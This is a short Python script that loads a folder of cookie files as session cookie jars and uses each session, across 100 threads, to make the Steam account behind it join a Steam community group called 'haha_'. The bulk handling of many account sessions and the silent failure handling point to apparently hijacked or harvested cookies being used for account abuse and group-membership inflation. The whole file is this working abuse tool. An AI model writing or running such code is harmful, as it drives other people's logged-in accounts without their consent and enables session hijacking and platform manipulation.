from http import cookiejar
import os
import requests
from multiprocessing.dummy import Pool as ThreadPool

os.chdir('F:/new/steamgroupadded/nolimits')
a  = os.listdir('F:/new/steamgroupadded/nolimits')
def check(filename):
    try:
        file = f"{filename}"

        cookie = open(file, "r+", encoding="utf-8", errors="ignore").read()
        with open(file, "w", encoding="utf-8", errors="ignore") as s:
            s.write(str("# Netscape HTTP Cookie File" + "\n" + cookie))

        try:
            cj = cookiejar.MozillaCookieJar(file)
            cj.load()
        except:
            print('1')

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en,ru;q=0.9,ru-RU;q=0.8,en-US;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'DNT': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        }
        with requests.Session() as session:
            response = session.get('https://steamcommunity.com/groups/haha_', cookies=cj, headers=headers)
            data = {
                'action': 'join',
                'sessionID': f"{session.cookies['sessionid']}",
            }
            response = session.post('https://steamcommunity.com/groups/haha_', headers=headers,
                                     data=data)


    except:
        nevalid=1

pool = ThreadPool(100)
results = pool.map(check, a)
pool.close()
pool.join()